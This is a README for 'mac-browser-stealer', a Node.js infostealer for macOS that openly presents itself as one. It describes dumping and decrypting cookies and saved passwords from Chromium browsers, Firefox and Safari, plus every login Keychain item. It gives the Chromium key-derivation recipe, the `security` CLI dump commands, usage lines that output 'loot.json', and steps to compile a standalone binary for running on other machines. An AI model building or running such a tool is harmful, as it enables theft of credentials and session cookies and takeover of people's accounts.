# mac-browser-stealer

A zero-dependency Node.js stealer for macOS. It reads and decrypts browser
**cookies** and **saved passwords** from every Chromium-based browser on the
machine (Chrome, Edge, Brave, Chromium, Vivaldi, Opera, and any other app with
a `Safe Storage` Keychain entry), plus a full **macOS Keychain dump** of every
saved password. Everything is written to a local JSON file — no network beacon.

The whole thing is plain JavaScript with **no npm dependencies**: SQLite is
parsed by hand (`lib/sqlite.js`), crypto uses `node:crypto`, and the Keychain is
read via the `security` CLI. That keeps it compilable to a single standalone
binary with [`pkg`](https://github.com/vercel/pkg).

## What it steals

- **Chromium browsers** (Chrome, Edge, Brave, Chromium, Vivaldi, Opera) —
  every cookie from every profile, and every saved password from every
  `Login Data*` file (the local store *and* the per-Google-account
  `Login Data For Account` store), decrypted to plaintext where possible.
- **Firefox** — every cookie from every profile (custom `-profile` dirs, Tor
  Browser, camoufox included) plus saved passwords from `logins.json`,
  decrypted with the default (no-master-password) key. Entries protected by a
  master password are reported with `decryption_failed`.
- **Safari** — saved passwords from `DataVault.db` (decrypted with the Keychain
  "Safari Forms AutoFill Encryption Key") and cookies from
  `Cookies.binarycookies`. Both paths are TCC-protected on recent macOS, so
  they're read when permitted and reported as unavailable otherwise.
- **Keychain** — every generic-password item in the login Keychain, with its
  value retrieved where the `security` CLI allows it.

## How it works

### SQLite without a native addon

Browser databases (`Cookies`, `Login Data`) are SQLite files. Rather than link a
native SQLite library (which would break `pkg` single-binary compilation),
`lib/sqlite.js` parses the raw file format directly:

- `readSchema(buf)` scans the file for `sqlite_master` rows to recover each
  table's name, columns and affinities.
- `scanRecords(buf, colTypes, validator)` walks the whole file and returns every
  record whose column count and serial types match a table, filtered by a
  validator that rejects false positives (a `host_key` must look like a domain,
  an `origin_url` must be a real login origin — `http(s)://`, `android://`
  app-sync entries, or `file://`).

### Chromium cookie / password decryption

Confirmed against the Chromium source (`components/os_crypt/async`): the
on-disk value is `"v10" | ciphertext` (AES-128-CBC) with a **fixed IV of 16
space bytes**, and

```
key = PBKDF2-HMAC-SHA1(keychain_secret, "saltysalt", 1003, 16)
```

where `keychain_secret` is the value of the browser's `<Browser> Safe Storage`
Keychain item. Older Chrome files instead store a random IV inline
(`"v10" | IV(16) | ciphertext`), and a single profile can contain a mix of both,
so the decryptor tries every key variant × every layout and keeps the cleanest
result.

### Keychain

`security dump-keychain` lists every generic-password item; each value is then
retrieved with `security find-generic-password -w`.

## Usage

```sh
node stealer.js                 # -> ./steal-<timestamp>.json
node stealer.js --out loot.json # -> ./loot.json
node stealer.js --quiet         # no console output
```

### Compile to a standalone binary

```sh
npx pkg . --targets node18-macos-arm64,node18-macos-x64 --output dist/mac-browser-stealer
./dist/mac-browser-stealer --out loot.json
```

The binary bundles the Node runtime and the script — it runs on a clean macOS
machine with no Node installed.

## Output format

```jsonc
{
  "generated_at": "...",
  "hostname": "...",
  "platform": "darwin ...",
  "browsers": [
    {
      "name": "chrome",
      "keychain_secret": "<base64 keychain value>",
      "profiles": [
        {
          "name": "Default",
          "cookies": [ { "host": "...", "name": "...", "value": "...", ... } ],
          "passwords": [ { "url": "...", "username": "...", "password": "...", ... } ]
        }
      ]
    }
  ],
  "firefox": {
    "profiles": [
      { "path": ".../<profile-dir>", "cookies": [ ... ], "passwords": [ ... ] }
    ]
  },
  "safari": { "exists": true, "keychain_key": "...", "cookies": [ ... ], "passwords": [ ... ] },
  "other_apps": [ ... ],
  "keychain": { "total": "<n>", "entries": [ { "service": "...", "account": "...", "value": "..." } ] }
}
```

Entries that could not be decrypted carry `decryption_failed: true` and the raw
`encrypted_value` (hex) so they can be recovered later with the right key.

## Notes

- Runs as the current user; it can only read files and Keychain items that user
  can access.
- The Keychain dump is the slowest part (one `security` process per item).
- No files are modified or deleted — the stealer is strictly read-only.
